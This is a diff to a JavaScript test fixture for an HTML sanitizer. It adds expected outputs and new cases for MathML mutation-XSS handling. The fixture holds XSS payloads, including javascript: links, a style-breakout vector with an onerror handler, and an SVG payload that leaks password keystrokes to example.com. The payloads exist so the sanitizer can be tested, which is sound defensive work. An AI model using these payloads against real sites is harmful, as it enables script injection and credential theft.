@@ -913,7 +913,8 @@ module.exports = [
       "payload": "<div id=\"130\"><math href=\"javascript:alert(130)\">CLICKME</math>\n<math>\n<!-- up to FF 13 -->\n<maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(2)\">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype=\"statusline\" xlink:href=\"javascript:alert(3)\">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//[\"'`-->]]>]</div>",
       "expected": [
           "<div id=\"130\"><math>CLICKME</math>\n<math>\n\n\n\n\n\n</math>//[\"'`--&gt;]]&gt;]</div>",
-          "<div id=\"130\"><math>CLICKME</math>\n<math>\n\nCLICKME\n\n\nCLICKME<mtext>http://http://google.com</mtext>\n</math>//[\"'`--&gt;]]&gt;]</div>"
+          "<div id=\"130\"><math>CLICKME</math>\n<math>\n\nCLICKME\n\n\nCLICKME<mtext>http://http://google.com</mtext>\n</math>//[\"'`--&gt;]]&gt;]</div>",
+          "<div id=\"130\"><math>CLICKME</math>\n//[\"'`--&gt;]]&gt;]</div>"
       ]
   }, {
       "payload": "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>",
@@ -1071,7 +1072,10 @@ module.exports = [
           "<svg><p></p><math><title></title></math></svg>",
           "<svg xmlns=\"http://www.w3.org/2000/svg\"><p></p><math><title /></math></svg></svg>",
           "<svg xmlns=\"http://www.w3.org/2000/svg\"><p></p><math><title /></math></svg>",
-          "<svg xmlns=\"http://www.w3.org/2000/svg\"><p></p><math></math></svg>"
+          "<svg xmlns=\"http://www.w3.org/2000/svg\"><p></p><math></math></svg>",
+          "<svg xmlns=\"http://www.w3.org/2000/svg\"><p></p></svg>",
+          "<svg><p></p></svg>",
+          "<svg></svg><p></p><img src=\"x\">"
       ]
   }, {
       "title": "Tests against attribute-based mXSS behavior 1/3",
@@ -1150,10 +1154,28 @@ module.exports = [
           ""
       ]
   }, {
+      "title": "Tests against additonal problems regarding HTML inside MathML 1/2",
+      "payload": "<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title=\"</style><img src onerror='alert(1)'>\"></style></h1>",
+      "expected": [
+          ""
+      ]
+  }, {
+      "title": "Tests against additonal problems regarding HTML inside MathML 2/2",
+      "payload": "<!-- more soon -->",
+      "expected": [
+          ""
+      ]
+  },   {
       "title": "Tests against proper handling of leading whitespaces",
       "payload": " ",
       "expected": [
           " "
+      ]
+  }, {
+      "title": "Tests against proper handling of empoty MathML containers",
+      "payload": "<div><math></math></div>",
+      "expected": [
+          "<div><math></math></div>"
       ]
   }
 ];
